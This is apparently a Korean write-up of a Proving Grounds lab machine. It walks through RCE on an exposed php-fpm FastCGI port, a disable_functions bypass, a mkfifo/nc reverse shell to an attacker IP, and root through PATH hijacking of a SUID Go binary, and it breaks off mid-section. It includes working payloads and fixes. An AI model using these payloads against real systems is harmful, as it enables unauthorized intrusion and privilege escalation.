---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/svc/php-fpm
  - tech/enum/dirbust
  - tech/lin/suid
  - tech/lin/path-hijack
  - tech/payload/revshell
  - tech/exec/ssh-key
type: machine
platform: pg
os: linux
ip: 192.168.248.205
ports: [22, 80, 9000]
services: [cslistener, http, ssh]
status: solved
manual_tags: true
manual_cves: true
tech_count: 6
---

> [!info] 요약
> 타겟 `192.168.248.205` · Debian 10(`planetexpress`, 4.19.0-18) · Fundamental · 플래그 2개
> 진입점: Pico CMS `config.yml` 이 주석 처리된 자작 플러그인 이름 누출 → `/plugins/PicoTest.php` 요청 시 `phpinfo()` 실행되어 `DOCUMENT_ROOT` 확보 → tcp/9000 에 노출된 php-fpm 에 FastCGI 직타로 RCE(`www-data`)
> 권한상승: SUID Go 바이너리 `/usr/sbin/relayd` 가 `iptables` 를 상대경로로 exec → PATH 하이재킹 → root
> 플래그 값은 **2026-08-20 인스턴스** 것. PG 는 박스를 다시 켤 때마다 새로 만듦.
> **이 박스는 정지됨.** 「관측 없음」 표시가 붙은 항목은 재수집 불가.
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.205

### Initial Access – 설정 파일 주석 유출로 docroot 확보 후 무인증 php-fpm 에 FastCGI 직타 RCE

**Vulnerability Explanation:** 세 요소가 체인됨.
- Pico CMS `config.yml` 이 웹에서 그대로 읽힘 — 맨 아래 주석 처리된 `#PicoTest:\n#  enabled: true` 블록이 자작 플러그인 파일명을 노출
- `/plugins/PicoTest.php` 는 Pico 상에서 비활성이지만 파일 자체가 웹루트 아래 있어 Apache 가 직접 실행 — 내용은 `phpinfo()` 이고 `DOCUMENT_ROOT`·`SCRIPT_FILENAME`·PHP 버전 등을 노출
- php-fpm 이 유닉스 소켓이 아니라 `0.0.0.0:9000` 으로 노출되고 방화벽이 그 포트를 열어둠 — 인증 없는 FastCGI 접속 허용. `SCRIPT_FILENAME` 이 가리키는 파일이 실제 존재하면 `PHP_VALUE: auto_prepend_file=php://input` 로 요청 본문이 PHP 코드로 먼저 실행됨

**Vulnerability Fix:**
- php-fpm 은 유닉스 소켓 또는 `127.0.0.1` 바인딩만 사용. TCP 로 열 수밖에 없다면 `listen.allowed_clients` 로 제한
- 진단용 스크립트(`phpinfo()` 등)를 웹루트에 남기지 말 것. 비활성 플러그인이라도 파일이 웹루트에 있으면 그대로 실행됨
- `config/`·`vendor/`·`plugins/` 를 웹루트 밖으로 빼거나 파일 단위 차단. 디렉터리 리스팅만 막는 것(403)으로는 파일명을 아는 사람을 못 막음

**Severity:** Critical — 무인증 원격 RCE

**Steps to reproduce the attack:**
1. `/config/config.yml` 열람 → 주석 처리된 `PicoTest` 플러그인 이름 확인
2. `/plugins/PicoTest.php` 요청 → `phpinfo()` 렌더, `DOCUMENT_ROOT=/var/www/html/planetexpress` 확보
3. 9000/tcp 에 FastCGI 레코드 직접 전송(`SCRIPT_FILENAME` = docroot 내 존재하는 출력 없는 파일, `PHP_VALUE: auto_prepend_file=php://input` 등)
4. POST 본문에 PHP 코드를 실어 임의 실행 확인(`XPWNX` 마커)
5. `disable_functions` 블랙리스트 우회 함수(`passthru`/`popen`/`proc_open`) 확인 후 명령 실행
6. 80 포트로 리버스셸 연결(443 은 아웃바운드 차단)

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.205 | TCP: 22, 80, 9000 |

top-200 을 먼저 돌리고 전수 스캔으로 확인.

```text
nmap -Pn -T4 --top-ports 200 -oN quick.log 192.168.248.205

Nmap scan report for 192.168.248.205
Host is up (0.085s latency).
Not shown: 197 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9000/tcp open  cslistener
```
— 출처: `~/PG/PlanetExpress/quick.log`

```text
nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.205

Nmap scan report for 192.168.248.205
Host is up (0.085s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-generator: Pico CMS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: PlanetExpress - Coming Soon !
9000/tcp open  cslistener?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
```
— 출처: `~/PG/PlanetExpress/nmap.log` (OS 추정·TRACEROUTE 블록 생략)

읽을 것 셋.
- `Not shown: 65532 filtered` — 닫힌 포트가 하나도 없음(무응답). 바로 위 `Warning: ... 1 open and 1 closed port` 가 같은 말임. ⚠️ 이걸 타겟 INPUT 체인 탓으로 읽으면 틀림 — root 로 읽은 `iptables -L -v -n`(Privilege Escalation 절)에서 INPUT 의 `DROP` 카운터가 `0 packets` 이고, 그 앞의 `-m conntrack --ctstate NEW,RELATED,ESTABLISHED -j ACCEPT` 가 새 연결까지 받아 뒤 규칙에 닿지 않음. 즉 여기서 보이는 `filtered` 는 상류(랩 네트워크) 필터링이고, 타겟 방화벽이 실제로 문 것은 OUTPUT 쪽뿐임
- `http-generator: Pico CMS` — `<meta name="generator">` 를 긁은 것. 버전은 안 나옴
- `9000/tcp cslistener?` — `cslistener` 는 IANA 등록명일 뿐 실제 서비스가 아님. `?` 는 `-sV` 프로브가 응답을 못 받았다는 표시

```text
(printf 'GET / HTTP/1.0\r\n\r\n'; sleep 3) | timeout 8 nc 192.168.248.205 9000 | xxd | head -20
```
출력 0줄. HTTP 로 말을 걸어도 아무것도 안 돌아오는 포트는 바이너리 프로토콜을 뜻함 — 9000 + PHP 사이트 조합이면 php-fpm 이 1순위.

**웹 — Pico CMS**

![[PG-PlanetExpress-pico-landing.png]]

"Coming Soon" 랜딩 한 장뿐. 폼(`name=email`)은 `action="/"` 라 아무 데도 안 감.

디렉터리를 손으로 훑음.

```text
403 280  /content/
403 280  /config/
403 280  /vendor/
403 280  /plugins/
403 280  /themes/
404 277  /composer.json
200 5176 /index.php
200 0    /content/index.md
404 16   /config/config.php
```

`/config/config.php` 의 404 본문 크기가 다름(16 vs 277).

```text
curl -s -i -m 10 "http://192.168.248.205/config/config.php"

HTTP/1.1 404 Not Found
Date: Thu, 20 Aug 2026 07:06:43 GMT
Server: Apache/2.4.38 (Debian)
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

File not found.
```

Apache 의 404 는 `Content-Length: 277` 짜리 HTML 문서. 여기는 `Transfer-Encoding: chunked` + 본문 `File not found.`(16바이트) — php-fpm 이 존재하지 않는 스크립트에 내는 응답이 Apache 를 그대로 통과해 나온 것. 이건 "이 사이트의 PHP 는 fpm 이 돌린다"까지만 확정 — 그 fpm 이 9000 이라는 것은 아직 아님(유닉스 소켓일 수도 있음). 9000 확정은 FastCGI 직타로 응답을 받은 시점(Initial Access 재현 절).

`.php` 가 아닌 파일은 Apache 가 그냥 줌.

```text
200 23215 /vendor/composer/installed.json
200 812   /config/config.yml
200 4898  /themes/launch/index.twig
```

**버전 판정** — `installed.json` 에서 컴포넌트 버전 전량 확인.

```text
erusev/parsedown 1.8.0-beta-7
erusev/parsedown-extra 0.8.0-beta-1
picocms/composer-installer v1.0.1
picocms/pico v2.1.4
picocms/pico-deprecated v2.1.4
picocms/pico-theme v2.1.4
symfony/polyfill-ctype v1.23.0
symfony/yaml v2.8.52
twig/twig v1.44.6
```
— 출처: `~/PG/PlanetExpress/installed.json`

Pico CMS 2.1.4. 이 박스에서 Pico 자체의 취약점은 쓰지 않음 — Pico 가 한 일은 `config.yml` 을 웹에서 읽히게 둔 것뿐.

**결정적인 한 줄 — `config.yml`**

```yaml
##
# Basic
#
site_title: PlanetExpress
base_url: ~

rewrite_url: ~
debug: true
timezone: ~
locale: ~

##
# Theme
#
theme: launch
themes_url: ~

theme_config:
    widescreen: false
twig_config:
    autoescape: html
    strict_variables: false
    charset: utf-8
    debug: ~
    cache: false
    auto_reload: true

##
# Content
#
date_format: %D %T
pages_order_by_meta: planetexpress 

pages_order_by: alpha
pages_order: asc
content_dir: ~
content_ext: .md
content_config:
    extra: true
    breaks: false
    escape: false
    auto_urls: true
assets_dir: assets/
assets_url: ~

##
# Plugins: https://github.com/picocms/Pico/tree/master/plugins
#
plugins_url: ~
DummyPlugin.enabled: false

PicoOutput:
  formats: [content, raw, json]

## 
# Self developed plugin for PlanetExpress
#
#PicoTest:
#  enabled: true
```
— 출처: `~/PG/PlanetExpress/config.yml` (`curl -s -m 10 "http://192.168.248.205/config/config.yml"`)

`debug: true` 도 있으나 값나가는 건 맨 아래 주석 처리된 `PicoTest` — "Self developed plugin" 이라고 적혀 있음. Pico 의 플러그인은 `plugins/<이름>.php` 에 놓임.

```text
200 66763 /plugins/PicoTest.php
```

66KB — 플러그인 소스가 아니라 **실행된 결과**.

![[PG-PlanetExpress-picotest-phpinfo.png]]

`phpinfo()`. 플러그인은 `config.yml` 에서 비활성이지만 파일 자체는 웹루트 아래에 있고 Apache 가 `.php` 를 fpm 에 넘김 — Pico 가 로드하든 말든 직접 요청하면 실행됨. 같은 이유로 `themes/`·`plugins/`·`vendor/` 아래의 모든 `.php` 는 직접 요청 대상.

phpinfo 에서 뽑은 것(`picotest_out.html`, 66763바이트):

```text
PHP Version                7.3.31-1~deb10u1
System                     Linux planetexpress 4.19.0-18-amd64 ... x86_64
Server API                 FPM/FastCGI
Loaded Configuration File  /etc/php/7.3/fpm/php.ini
$_SERVER['SERVER_SOFTWARE']       Apache/2.4.38 (Debian)
$_SERVER['SCRIPT_FILENAME']       /var/www/html/planetexpress/plugins/PicoTest.php
$_SERVER['DOCUMENT_ROOT']         /var/www/html/planetexpress
```
— 출처: `~/PG/PlanetExpress/picotest_out.html`

`DOCUMENT_ROOT = /var/www/html/planetexpress`. 이 한 줄이 Initial Access 를 열었음.

⚠️ 이 phpinfo 원문에는 `allow_url_include=On`·`open_basedir=/`·`extension_dir=/tmp`·`disable_functions=no value`·`auto_prepend_file=php://input` 도 Local/Master 양쪽에 찍혀 있으나 **이 다섯 값은 박스 설정이 아니라 몇 분 전 9000 으로 보낸 FastCGI 요청이 남긴 값과 글자까지 같음**(`fcgi.py` 의 `PHP_VALUE`/`PHP_ADMIN_VALUE` 참조 — 다섯 개가 그 두 지시자 문자열의 전부임). root 로 읽은 `php.ini:310` 에는 `disable_functions` 블랙리스트가 그대로 있어 정면으로 어긋남. 신뢰 가능한 값은 `PHP Version`·`System`·`Loaded Configuration File`·`DOCUMENT_ROOT`·`SCRIPT_FILENAME` — 전부 Apache/엔진이 채우는 줄. 지속 메커니즘과 자세한 판별 근거는 [[_PLAYBOOK]] (정찰 결과 자기오염, 신규 항목).

### Initial Access – FastCGI 직타

php-fpm 은 웹서버와 FastCGI 로 통신. 웹서버가 `SCRIPT_FILENAME` 같은 환경변수를 FastCGI 레코드로 싸서 보내면 fpm 이 그 파일을 실행하고 결과를 돌려줌. 인증은 없음 — 신뢰 경계가 "웹서버만 접속 가능하다"는 가정 위에 있음. fpm 이 유닉스 소켓이 아니라 `0.0.0.0:9000` 에 붙어 있고 방화벽이 그 포트를 열어두면, 아무나 웹서버 행세를 하며 임의 PHP 를 실행시킬 수 있음.

root 획득 후 확인한 실제 설정:

```text
/etc/php/7.3/fpm/pool.d/www.conf:6:listen = 0.0.0.0:9000
/etc/php/7.3/fpm/pool.d/www.conf:8:listen.owner = www-data
/etc/php/7.3/fpm/pool.d/www.conf:9:listen.group = www-data
```
— 출처: `~/PG/PlanetExpress/root_enum_fw.log`

Debian `php7.3-fpm` 패키지는 `listen = /run/php/php7.3-fpm.sock` 으로 출하함. `0.0.0.0:9000` 은 누가 일부러 바꾼 것.

**클라이언트** — 공개 도구(`fcgi_exp`, `Gopherus`) 대신 최소 FastCGI 클라이언트를 직접 작성(`~/PG/PlanetExpress/fcgi.py`, 87줄). `FCGI_BEGIN_REQUEST` → `FCGI_PARAMS`(name-value) → 빈 `FCGI_PARAMS` → `FCGI_STDIN`(본문) → 빈 `FCGI_STDIN`.

핵심 파라미터:

```python
'SCRIPT_FILENAME': script,
'REQUEST_METHOD' : 'POST',
'CONTENT_LENGTH' : str(len(payload)),
'PHP_VALUE'      : 'allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input',
'PHP_ADMIN_VALUE': 'extension_dir = /tmp\ndisable_functions = ',
```

세 지시자가 다 필요함 — `auto_prepend_file=php://input` 은 대상 스크립트보다 먼저 요청 본문을 PHP 로 실행, `allow_url_include=On` 은 `php://` 래퍼를 `include` 계열에서 허용, `open_basedir=/` 는 경로 제한 해제. `[가정]` `PHP_VALUE` 안의 지시자 구분자는 개행 — 세미콜론·콤마로 이으면 한 지시자 값으로 뭉쳐 안 먹을 것으로 보이나, 이 박스에서 분리 실험은 안 했고 처음부터 개행으로 씀.

**첫 시도 — docroot 를 모를 때:**

```text
python3 fcgi.py 192.168.248.205 9000 /var/www/html/index.php "echo 'PWN'; system('id');"

--- STDOUT ---
Status: 404 Not Found
Content-type: text/html; charset=UTF-8

File not found.

--- STDERR ---
Primary script unknown
```
— 출처: `~/PG/PlanetExpress/try1_fcgi_index.log`

FastCGI 로 말이 통한다는 것 자체가 이미 9000=php-fpm 의 두 번째 근거. 경로 후보 12개를 돌려도 전부 같은 응답(출력은 그중 첫 한 건만 남음, 나머지는 tmux 스크롤백과 함께 소멸). `/var/www/html/planetexpress` 는 추측 목록에 들어갈 이름이 아니었음 — 앞선 Service Enumeration 의 phpinfo 로 얻어야 하는 값.

**경로를 알고 나서:** `index.php` 를 대상으로 하면 Pico 의 HTML 이 쏟아져 페이로드 출력이 파묻힘(`try2_fcgi_realpath.log`, 5.7KB). 출력이 없는 파일을 골라야 결과가 보임.

```text
python3 fcgi.py 192.168.248.205 9000 /var/www/html/planetexpress/vendor/autoload.php "echo \"XPWNX\"; system(\"id\");"

--- STDOUT ---
Content-type: text/html; charset=UTF-8

XPWNX
--- STDERR ---
PHP message: PHP Warning:  system() has been disabled for security reasons in php://input on line 1
```
— 출처: `~/PG/PlanetExpress/try3_fcgi_autoload.log`

`XPWNX` 확인 = 임의 PHP 실행 확보. `system()` 은 막혀 있음.

**disable_functions 우회:** `PHP_ADMIN_VALUE` 로 `disable_functions` 를 빈 값으로 덮어도 `system()` 은 죽어 있음.

```text
python3 fcgi.py ... "echo ini_get(\"disable_functions\").\"|\".php_uname().\"|\".get_current_user();"

--- STDOUT ---
|Linux planetexpress 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64|www-data
```
— 출처: `~/PG/PlanetExpress/try4_disable_functions.log`

`disable_functions` 는 엔진이 뜰 때 함수 테이블에서 해당 함수를 제거함 — 요청 시점에 ini 문자열을 비워도 이미 사라진 함수는 안 돌아옴. `function_exists` 전수 조사:

```php
foreach(["system","exec","shell_exec","passthru","popen","proc_open","pcntl_exec","file_get_contents","file_put_contents","scandir","putenv","mail","imap_open","dl","curl_exec"] as $f)
    echo $f."=".(function_exists($f)?"Y":"N")." ";
```

```text
system=N exec=N shell_exec=N passthru=Y popen=Y proc_open=Y pcntl_exec=N file_get_contents=Y file_put_contents=Y scandir=Y putenv=Y mail=Y imap_open=N dl=N curl_exec=N
```
— 출처: `~/PG/PlanetExpress/try5_funcs.log`

`passthru`·`popen`·`proc_open` 생존. root 로 읽은 `php.ini` 가 이유를 보여줌.

```text
/etc/php/7.3/fpm/php.ini:310:disable_functions = system,exec,shell_exec,pcntl_alarm,pcntl_fork,pcntl_waitpid,
pcntl_wait,pcntl_wifexited,...,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,
```

블랙리스트가 `system`·`exec`·`shell_exec` 와 `pcntl_*` 전부만 나열하고 나머지는 빠짐.

**열거:**

```php
passthru("id; hostname; hostname -I; uname -a; ls -la /home /var/www/html/planetexpress; cat /etc/passwd | grep -v nologin; which nc ncat socat python python3 perl bash wget curl 2>/dev/null");
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
planetexpress
192.168.248.205 
Linux planetexpress 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64 GNU/Linux
/home:
drwxr-xr-x  2 astro astro 4096 Jan 10  2022 astro
   (`.`·`..` 와 `/var/www/html/planetexpress` 목록 생략)
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
astro:x:1000:1000::/home/astro:/bin/sh
/usr/bin/nc
/usr/bin/python
/usr/bin/python3
/usr/bin/perl
/usr/bin/bash
/usr/bin/wget
```
— 출처: `~/PG/PlanetExpress/try6_enum.log`

`which` 목록에서 `ncat`·`socat`·`curl` 빠짐 — 리버스셸 후보가 `nc`·`bash`·`python3`·`perl`·`wget` 로 좁혀짐. `/home/astro/local.txt` 는 `-rw-r--r--` 라 www-data 도 읽을 수 있었으나 **웹 경유로 읽은 플래그는 OSCP 채점상 0점**이라 넘어감. 플래그는 전부 SSH 대화형 세션에서 다시 뽑음(Post-Exploitation 절).

**리버스셸 — 443 실패, 80 성공:** 443 은 안 붙음(`payload_rev.php` → `try7_revshell.log` 는 `spawned` 만 찍고 `shell443.log` 는 `listening on [any] 443 ...` 에서 멈춤). Privilege Escalation 절에서 확인한 대로 타겟 OUTPUT 체인이 dport 53/80/9000 만 허용.

```php
$c = 'rm -f /tmp/.pf; mkfifo /tmp/.pf; (/bin/sh -i < /tmp/.pf 2>&1 | nc 192.168.45.207 80 > /tmp/.pf) &';
proc_open('/bin/bash -c '.escapeshellarg($c), [0=>['pipe','r'],1=>['file','/dev/null','w'],2=>['file','/dev/null','w']], $p);
echo "fired\n";
```
— 출처: `~/PG/PlanetExpress/payload_rev80.php` (전문)

⚠️ 443 판과 80 판은 포트만 다른 게 아님 — `proc_open` 의 stdout/stderr 를 `['pipe','w']` 에서 `['file','/dev/null','w']` 로, 셸 명령을 `... &` 에서 `( ... ) &` 서브셸로 함께 바꿈. 포트가 필요조건인 것은 root 로 읽은 `iptables -S` 로 확정되나(Privilege Escalation 절), 나머지 둘이 각각 필요했는지는 분리 실험을 안 함. `[가정]` 파이프가 FastCGI 요청 종료 시 닫혀 자식이 SIGPIPE 로 죽는다는 것이 `/dev/null` 로 바꾼 이유였으나 이 박스에서 그 자체를 실측하지는 않음.

Kali 쪽:

```text
listening on [any] 80 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.205] 57792
/bin/sh: 0: can't access tty; job control turned off
$ uid=33(www-data) gid=33(www-data) groups=33(www-data)
planetexpress
$
```
— 출처: `~/PG/PlanetExpress/shell80.log`

**Local.txt value:** `484f662f955b828510887c65d2565a7f`

`/home/astro/local.txt` 는 www-data 리버스셸에서도 읽을 수 있었으나(웹 경유는 0점) 실제로 값을 뽑은 것은 Privilege Escalation 뒤 root SSH 세션에서 `su - astro` 로 내려가 원위치 `cat` 한 시점 — 원문은 Post-Exploitation 절 참조.

### Privilege Escalation – SUID Go 바이너리 relayd 의 PATH 하이재킹

**Vulnerability Explanation:** `/usr/sbin/relayd` (`-rws---r-x`, 모드 4705, root 소유, `dpkg -S` 로 못 찾는 비패키지 바이너리)가 내부에서 `exec.Command("iptables", "-S")`/`("iptables","-L")` 를 **상대경로**로 호출. Go 의 `os/exec.Command` 는 이름에 `/` 가 없으면 `LookPath` 로 `$PATH` 를 뒤짐 — SUID 바이너리가 호출자의 `$PATH` 를 그대로 물려받으므로, 공격자가 쓸 수 있는 디렉터리를 PATH 앞에 놓고 그 이름으로 스크립트를 심으면 root 권한으로 실행됨.

**Vulnerability Fix:**
- SUID 바이너리에서 외부 명령은 반드시 절대경로로 호출(`exec.Command("/sbin/iptables", ...)`)
- SUID 자체를 최소화. 가능하면 `capabilities` 나 별도 데몬 + 소켓으로 권한 분리

**Severity:** Critical — 로컬 SUID 오설정으로 즉시 root

**Steps to reproduce the attack:**
1. SUID 목록에서 Debian 기본 13종 외 낯선 `/usr/sbin/relayd` 확인, `dpkg -S` 로 비패키지 확인
2. 바이너리를 웹루트로 복사해 Kali 에서 `curl` 로 내려받음(아웃바운드가 제한돼 있어 인바운드 80 을 역이용)
3. `nm`/`objdump` 로 `exec.Command("iptables", ...)` 상대경로 호출 확인
4. `/tmp/.x/iptables` 에 가짜 스크립트를 심고 `PATH=/tmp/.x:$PATH relayd -b up` 실행
5. `#!/bin/sh` 는 dash 가 euid 를 버려 조용히 실패 — `#!/usr/bin/python3` + `os.setreuid(0,0)` 로 교체해 root SUID `rootbash` 획득
6. `rootbash -p` 로 `/root/.ssh/authorized_keys` 에 키 설치 → SSH 대화형 root

**열거:** 셸을 잡자마자 다섯 개 중 넷을 돌림(`payload_enum2.php` → `enum_www-data.log`).

```text
sudo: a password is required          ← sudo -n -l
--- suid ---
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/relayd
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
```
— 출처: `~/PG/PlanetExpress/enum_www-data.log`

나머지 13개는 Debian 기본. `/usr/sbin/relayd` 만 목록에 없어야 할 것. 크론은 비어 있음(`/etc/crontab` 은 Debian 기본 run-parts 4줄, `/etc/cron.d/` 는 `.placeholder`·`php` 뿐).

⚠️ 다섯 번째인 `getcap -r / 2>/dev/null` 은 안 침 — SUID 에서 바로 답이 나와 넘어갔으나 산출물 어디에도 없어 "capabilities 도 없었다"고 쓸 근거가 없음. 결과적으로 문제는 없었으나 습관으로는 나쁜 생략.

```text
ls -la /usr/sbin/relayd
-rws---r-x 1 root root 3644754 Jan 10  2022 /usr/sbin/relayd

file: setuid ELF 64-bit LSB executable, x86-64, statically linked, Go BuildID=..., not stripped
dpkg-query: no path found matching pattern /usr/sbin/relayd
```
— 출처: `~/PG/PlanetExpress/enum_relayd.log` (`file` 의 BuildID·`stat` 블록 생략)

모드 4705 — owner `rws`, group `---`, other `r-x`. www-data 는 other 라서 실행·읽기 둘 다 가능(분석용 복사도 됨). `dpkg -S` 가 못 찾음 = 패키지가 아니라 누가 얹은 파일.

```text
Usage: relayd [options] [actions]
Actions:
  default action      start daemon
  -h                  show this help message
  -v                  show version info
  -k                  kill running daemon
  -s                  get running status
  -U                  hup (reload configs)
  -a [service]        add service for relay
  -r [service]        remove service for relay
  -i                  get real client ip
  -b [up|down]        broadcast the DS boot state
  -R                  reopen the log file
Options:
  -C [file]           read config from file
  -d                  enable debug mode. will not run in background
  -P [file]           set pid file for daemon
  -g [ip]             remote source ip
  -n [port]           remote source port
```
— 출처: `~/PG/PlanetExpress/enum_ps.log` (`--- relayd usage ---` 블록 전문)

`relayd version: 1.0-4242, Dec 18 2021 13:37`. "DS boot state" 는 Synology DiskStation 냄새이나 실제로는 PG 가 만든 가짜 — 상세는 아래 「바이너리 분석」.

**바이너리를 Kali 로 회수:** 타겟 아웃바운드는 dport 53/80/9000 로만 열려 있고(이 절 부록 `iptables -S`) 타겟에 `curl` 도 없음 — 웹루트에 복사해 두고 Kali 에서 내려받는 쪽이 확실함. 인바운드 80 을 역이용한 것.

```text
cp /usr/sbin/relayd /var/www/html/planetexpress/assets/relayd.bin
63f7be5bc3bddda4783e84f7db1fedd0  /var/www/html/planetexpress/assets/relayd.bin

curl -s http://192.168.248.205/assets/relayd.bin -o relayd.bin
63f7be5bc3bddda4783e84f7db1fedd0  relayd.bin
```

md5 일치 — 온전히 회수됨(정리 시 웹루트 사본은 삭제 — Post-Exploitation 「남긴 흔적」).

**바이너리 분석:** Go 바이너리라 `not stripped` 면 심볼이 다 보임.

```text
nm relayd.bin | grep " T main\."
0000000000518b60 T main.addAndRemoveService
00000000005180c0 T main.broadcast
00000000005181e0 T main.getClientIP
00000000005183e0 T main.getStatus
0000000000517c80 T main.getVersion
0000000000518060 T main.killDaemon
0000000000518ca0 T main.main
0000000000517820 T main.parseOptions
0000000000518da0 T main.parseOptions.func1
0000000000517f00 T main.printDefaultMsg
0000000000517d20 T main.printMsg
0000000000518a00 T main.readConfig
0000000000518780 T main.runMain
0000000000517f80 T main.setPID
```
— 출처: 회수한 `~/PG/PlanetExpress/relayd.bin` 에 `nm` 실행

심볼 14개짜리 작은 프로그램 — 도움말의 액션 목록과 거의 1:1 대응(`-a`/`-r`↔`addAndRemoveService`, `-i`↔`getClientIP`, `-b`↔`broadcast`, `-C`↔`readConfig`, `-P`↔`setPID`)이고, 도움말에 없는 별도 기능은 심볼에도 안 보임. Go 정적 링크라 `T`(대문자, 전역 텍스트 심볼)로 잡힘 — 소문자 `t` 로 grep 하면 빈손.

```text
nm relayd.bin | grep -E " T os/exec\.(Command|LookPath)$"
00000000004d4180 T os/exec.Command
00000000004d6ba0 T os/exec.LookPath
```

`main` 영역만 디스어셈해 호출 지점 확인.

```text
objdump -d --start-address=0x517800 --stop-address=0x519000 relayd.bin > relayd.main.asm

566:  51812b:  call   4d4180 <os/exec.Command>     ← main.broadcast 안
1023: 518883:  call   4d4180 <os/exec.Command>     ← main.runMain 안
```
— 출처: `~/PG/PlanetExpress/relayd.main.asm`

Go 는 문자열을 (포인터, 길이) 쌍으로 넘김. 두 호출 직전의 `lea`/`mov` 가 실을 인자 — 그 주소를 파일 오프셋으로 환산해 읽으면:

```text
0x559578 8 b'iptables'
0x5583db 2 b'-S'      ← broadcast
0x5583d9 2 b'-L'      ← runMain
```
— 출처: `relayd.bin` 의 해당 가상주소를 직접 읽음. 두 호출 직전의 `lea ... # 5583db` / `mov $0x2,%ebx` 와 `lea ... # 559578` / `mov $0x8,%ebx` 가 `relayd.main.asm` 에 그대로 있음

`exec.Command("iptables", "-S")` — 절대경로가 아님. `-b up` 이 `main.broadcast` 를 부름.

**헛다리 — `-C`·`-P`:** `-C [file]` 과 `-P [file]` 은 각각 임의 파일 읽기/쓰기처럼 보였으나 둘 다 아님. `-C` 는 JSON 파서에 넣고 실패 사유만 찍음(내용은 안 보여줌).

```text
timeout 10 /usr/sbin/relayd -d -C /etc/shadow 2>&1 | head -20
[ERR] 2026-08-20 03:12:31 config.cpp:1539 write
[ERR] 2026-08-20 03:12:31 config.cpp:1213 open failed [/usr/etc/relayd/misc.conf.tmp.12217]
[ERR] 2026-08-20 03:12:31 bad json format [/etc/shadow]
[ERR] 2026-08-20 03:12:31 invalid config file
rc=0
```

`-P` 도 아님 — `main.setPID` 디스어셈은 `os.Stat` 한 번 부르고 실패 로그 문자열을 만드는 게 전부(파일을 만들지 않음). `config.cpp:1539` 같은 C++ 파일:행 표기가 박혀 있지만 실제로는 Go 로 빌드됨(`/usr/lib/go-1.17/src/...` 경로가 문자열에 남음) — 가짜 로그 문구로 위장한 미끼. `github.com/docker/docker/pkg/namesgenerator` 로 `vigorous_haibt` 같은 alias 를, `github.com/google/uuid` 로 serverID 를 매번 새로 생성.

**첫 시도 실패 — dash 가 권한을 버림:**

```sh
mkdir -p /tmp/.x
printf '#!/bin/sh\ncp /bin/bash /tmp/.x/rootbash\nchmod 4755 /tmp/.x/rootbash\nid > /tmp/.x/whoami.txt\n' > /tmp/.x/iptables
chmod 755 /tmp/.x/iptables
PATH=/tmp/.x:$PATH timeout 30 /usr/sbin/relayd -b up 2>&1 | head -20
```
— 출처: `~/PG/PlanetExpress/payload_pathhijack.php` (`passthru` 한 줄을 셸 명령 단위로 끊어 옮김)

스크립트는 실행됨.

```text
-rwsr-xr-x  1 www-data www-data 1168776 Aug 20 03:14 rootbash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
— 출처: `~/PG/PlanetExpress/try10_pathhijack.log`

`rootbash` 소유자가 www-data — `chmod 4755` 는 먹었지만 root 소유가 아니라 무의미. `id` 에도 `euid=0` 없음.

```text
grep -E "^(Uid|Gid|CapEff)" /proc/self/status      ← 하이재킹된 스크립트 안에서
Uid:	33	33	33	33

ps -o pid,ppid,ruser,euser,cmd -p $PPID
  PID  PPID RUSER    EUSER    CMD
 1338  1337 www-data root     /usr/sbin/relayd -b up
```
— 출처: `~/PG/PlanetExpress/try11_suid_debug.log`

부모(`relayd`)는 `EUSER=root` 인데 자식은 `Uid: 33 33 33 33`(real·effective·saved 전부 33) — 누가 euid 를 버림. 범인은 `#!/bin/sh` = dash. dash 는 시작 시 `uid != euid` 면 스스로 euid 를 uid 로 내림(`-p` 없는 bash 도 동일).

Kali 로컬 재현(이 박스 관측이 아니라 Kali 로컬 실측). setuid 래퍼 `w` 로 각 인터프리터 확인 — 홈 디렉터리(ext4)에서 수행. Kali `/tmp` 는 `tmpfs ... nosuid` 라 거기서 빌드하면 python 도 euid 를 못 받는 것처럼 오판됨(`mount | grep /tmp` 로 먼저 확인).

```text
== dash script ==      ./w ~/dashtest/s.sh
uid=1000(kali) gid=1000(kali) groups=...              ← euid 없음
== python script ==    ./w ~/dashtest/p.py
1000 0                                                ← (uid, euid)
== bash -c id ==       ./w /bin/bash -c id
uid=1000(kali) gid=1000(kali) groups=...              ← euid 없음
== bash -p -c id ==    ./w /bin/bash -p -c id
uid=1000(kali) gid=1000(kali) euid=0(root) groups=... ← 유지
```

`#!/bin/bash -p`·`#!/bin/sh -p` 셔뱅도 동일하게 euid 를 유지(둘 다 확인). `dash 0.5.12-12`, `/bin/sh → /usr/bin/dash`.

**두 번째 시도 — python:**

```python
